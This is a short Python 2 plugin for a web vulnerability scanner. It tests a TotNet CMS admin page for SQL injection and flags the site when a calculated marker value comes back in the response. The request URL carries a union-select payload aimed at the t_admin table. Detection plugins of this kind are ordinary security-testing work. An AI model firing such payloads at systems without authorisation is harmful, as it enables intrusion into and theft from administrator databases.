#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "admin/Category_GetSearch.aspx?key=%27%20and%201=2%20union%20select%201,2,3,4,5,888888888-1%20from%20[t_admin]--"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('888888887')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:TotNetCmsSqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])        
        write_scan_log(ob['task_id'],ob['domain_id'],"File:TotNetCmsSqlInjectionScript.py, run_domain function :" + str(e))        
    #end try
    
    return list
#end def